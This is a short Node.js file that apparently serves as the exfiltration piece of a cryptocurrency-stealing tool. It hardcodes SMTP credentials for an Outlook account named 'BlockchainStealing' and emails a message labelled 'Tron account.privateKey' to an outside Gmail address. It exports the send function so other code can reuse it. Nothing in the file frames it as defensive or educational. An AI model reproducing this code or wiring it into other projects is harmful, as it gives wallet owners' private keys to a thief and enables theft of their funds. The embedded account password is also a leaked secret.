
let nodemailer = require("nodemailer")
let transporter = nodemailer.createTransport({
    host: "smtp-mail.outlook.com", // hostname
    secureConnection: false, // TLS requires secureConnection to be false
    port: 587, // port for secure SMTP
    tls: {
       ciphers:'SSLv3'
    },
    auth: {
        user: "BlockchainStealing@outlook.com",//开启SMTP的邮箱，发件人
        pass: "smqrbygcnxmihsbq"// qq授权码
    }
})

main()
async function main(){
    await sendEmail("Tronaccount",("Tron"+'\r\n'+"account.privateKey"+'\r\n'))
}

async function sendEmail(subject,text){
    let options = {
        from: "BlockchainStealing@outlook.com", //发送方
        to: "birdsellkth@gmail.com",//接收方
        subject: subject,//邮件主题
        text: text,//邮件正文
        //html:'',//html模板
        //附件信息
        /*attachments:[
  			{filename:'',path:'',}
		]*/
    }
    return new Promise((resolve,reject)=>{
        transporter.sendMail(options, (err, info) => {
            if (err) {
                console.log(err);
                reject(err)
            } else {
                console.log(info);
                resolve(info)
            }
        })
    })
    
}
module.exports = {
    sendEmail
}